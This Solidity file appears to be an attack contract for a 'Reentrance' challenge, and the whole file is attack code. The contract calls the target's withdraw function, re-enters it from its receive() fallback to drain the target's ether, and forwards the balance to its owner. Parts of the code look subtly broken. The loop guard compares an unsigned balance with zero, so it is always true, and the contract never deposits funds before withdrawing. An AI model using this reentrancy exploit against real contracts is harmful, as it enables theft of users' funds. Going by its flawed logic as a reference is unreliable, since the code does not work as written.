// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Attack {
    Reentrance reentrance;
    address payable public owner;

    constructor(address payable _reentrance) public payable {
        reentrance = Reentrance(_reentrance);
        owner = msg.sender;
    }

    function attack() public {
        reentrance.withdraw(1 ether);
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        if (address(reentrance).balance >= 0) {
            reentrance.withdraw(0.001 ether);
        }
    }
}
